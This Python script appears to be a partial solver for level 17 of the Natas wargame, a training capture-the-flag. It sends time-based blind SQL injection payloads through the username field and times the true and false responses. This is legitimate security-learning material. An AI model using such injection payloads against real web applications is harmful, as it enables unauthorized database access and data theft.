"""
"""

import requests
import time
from bs4 import BeautifulSoup
from typing import Optional

from natas_utils import *

LEVEL = 17

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # form action: POST to /index.php (can be /)
    #
    # The server code querying is not POST-specific, so params on a GET should
    # work.
    #
    # A non-null "debug" param on a GET request will leak info about the query
    # that's executed.

    success_start = time.perf_counter()
    success_params = {
        "username": "natas18\" or if(1, sleep(0.5), null) # ",
        "submit": "Check existence",
        "debug": "true",
    }
    # no users output here because the `echo` lines are commented out in the
    # source code
    response = requests.get(url, auth=login, params=success_params)
    success_end = time.perf_counter()
    print(BeautifulSoup(response.text, "html.parser").find("body").prettify())

    fail_start = time.perf_counter()
    fail_params = {
        "username": "natas18\" or if(0, sleep(0.5), null) # ",
        "submit": "Check existence",
        "debug": "true",
    }
    # no users output here because the `echo` lines are commented out in the
    # source code
    response = requests.post(url, auth=login, params=fail_params)
    fail_end = time.perf_counter()
    print(BeautifulSoup(response.text, "html.parser").find("body").prettify())

    print(success_end - success_start)
    print(fail_end - fail_start)

    return None

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))